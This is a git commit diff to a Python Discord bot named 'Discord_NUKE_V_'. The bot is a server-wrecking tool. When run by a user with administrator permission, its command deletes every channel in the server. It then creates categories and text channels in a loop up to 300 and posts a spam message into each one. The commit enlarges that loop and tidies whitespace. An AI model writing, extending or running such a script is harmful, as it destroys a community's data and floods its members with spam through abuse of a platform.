f8fd3090729ab2a4b47a9d42484e338f165eef72
DieserGhost <144170441+DieserGhost@users.noreply.github.com>
2024-08-04 14:08:51 +0200

    Update Discord_NUKE_V_.py

--- Discord-NUKE-V!/Discord_NUKE_V_.py
+++ Discord-NUKE-V!/Discord_NUKE_V_.py
@@ -20,26 +20,37 @@ async def on_ready():
     print('Bot is ready.')
 
 async def setup_command(ctx):
-    await bot.wait_until_ready()  
+    await bot.wait_until_ready()
 
     if ctx.author.guild_permissions.administrator:
         guild = ctx.guild
         for channel in guild.channels:
             await channel.delete()
 
-        channel_name = data.get('channel_name', 'gg')  
-        category_name = data.get('category_name', 'Report')  
-        message_content = data.get('message_content', 'HELLO I\'M HERE')  
+        channel_name = data.get('channel_name', 'gg')
+        category_name = data.get('category_name', 'Report')
+        message_content = data.get('message_content', 'HELLO I\'M HERE')
 
-        category = await guild.create_category(category_name)
+        num_channels_per_category = 50
+        num_categories = 0
 
-        for i in range(1, 35):
-            new_channel = await category.create_text_channel(f"{channel_name}")
-            if isinstance(new_channel, discord.TextChannel):  
-                for _ in range(60):
-                    await new_channel.send(message_content)
-        
-        await ctx.send("command executed ;)")
+        while True:
+            category = await guild.create_category(f"{category_name}_{num_categories + 1}")
+
+            for i in range(num_channels_per_category):
+                new_channel = await category.create_text_channel(f"{channel_name}_{i + 1}")
+                if isinstance(new_channel, discord.TextChannel):
+                    for _ in range(1):
+                        await new_channel.send(message_content)
+
+            num_categories += 1
+
+            # Break the loop if the total number of channels exceeds 300
+            total_channels = num_channels_per_category * num_categories
+            if total_channels >= 300:
+                break
+
+        await ctx.send("Command executed ;)")
     else:
         await ctx.send("You don't have the required permissions.")
 
